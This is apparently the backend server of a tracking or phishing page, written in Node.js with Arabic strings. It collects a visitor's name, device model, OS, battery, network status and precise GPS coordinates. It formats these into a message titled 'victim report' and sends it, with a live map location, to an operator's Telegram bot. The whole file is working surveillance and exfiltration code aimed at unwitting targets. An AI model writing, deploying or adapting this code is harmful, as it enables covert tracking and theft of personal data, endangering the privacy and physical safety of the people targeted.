import express from 'express';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
app.use(express.json());
app.use(express.static('.'));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.post('/api/send-all-data', async (req, res) => {
  const { username, device, battery, network, location, timestamp } = req.body;
  
  if (!username) {
    return res.status(400).json({ error: 'missing username' });
  }

  try {
    let message = `📱 تقرير الضحية\n`;
    message += `═══════════════════\n\n`;
    
    // معلومات المستخدم
    message += `👤 الاسم: ${username}\n`;
    message += `🕐 الوقت: ${timestamp || new Date().toISOString()}\n\n`;
    
    // معلومات الجهاز
    if (device) {
      message += `📱 معلومات الجهاز:\n`;
      message += `├─ الموديل: ${device.deviceModel || 'غير معروف'}\n`;
      message += `├─ النظام: ${device.os || 'غير معروف'}\n`;
      message += `├─ المتصفح: ${device.platform || 'غير معروف'}\n`;
      message += `├─ الشاشة: ${device.screenWidth || '?'}×${device.screenHeight || '?'}\n`;
      message += `└─ دقة الشاشة: ${device.pixelRatio || '?'}\n\n`;
    }
    
    // معلومات البطارية
    if (battery) {
      message += `🔋 البطارية:\n`;
      message += `├─ النسبة: ${battery.level || 'غير معروف'}%\n`;
      message += `├─ الشحن: ${battery.charging ? '✅ يشحن' : '❌ لا يشحن'}\n`;
      if (battery.chargingTime && battery.chargingTime !== Infinity) {
        message += `├─ وقت الشحن: ${Math.round(battery.chargingTime / 60)} دقيقة\n`;
      }
      if (battery.dischargingTime && battery.dischargingTime !== Infinity) {
        message += `└─ وقت التفريغ: ${Math.round(battery.dischargingTime / 60)} دقيقة\n`;
      }
      message += `\n`;
    }
    
    // معلومات الشبكة
    if (network) {
      message += `📶 الشبكة:\n`;
      message += `├─ الاتصال: ${network.connectionType || 'غير معروف'}\n`;
      message += `├─ السرعة: ${network.speed || 'غير معروف'}\n`;
      message += `├─ الإشارة: ${network.signal || 'غير معروف'}\n`;
      message += `└─ الحالة: ${network.isOnline ? '🟢 متصل' : '🔴 غير متصل'}\n\n`;
    }
    
    // معلومات الموقع
    if (location) {
      message += `📍 الموقع الجغرافي:\n`;
      if (location.latitude && location.longitude) {
        message += `├─ خط العرض: ${location.latitude}\n`;
        message += `├─ خط الطول: ${location.longitude}\n`;
        message += `├─ الدقة: ${location.accuracy || 'غير معروف'} متر\n`;
        if (location.altitude) {
          message += `├─ الارتفاع: ${location.altitude} متر\n`;
        }
        if (location.speed) {
          message += `├─ السرعة: ${location.speed} م/ث\n`;
        }
        message += `└─ 🔗 خرائط جوجل: https://www.google.com/maps?q=${location.latitude},${location.longitude}\n\n`;
      } else {
        message += `└─ الحالة: ${location.error || 'غير متاح'}\n\n`;
      }
    }
    
    message += `═══════════════════\n`;
    message += `🔒 تم جمع البيانات بواسطة النظام الآلي`;
    
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
    const result = await response.json();
    
    // إرسال موقع على الخريطة إذا كان متاحاً
    if (location && location.latitude && location.longitude) {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          latitude: location.latitude,
          longitude: location.longitude,
          live_period: 60
        })
      });
    }
    
    res.json({ success: true, result });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
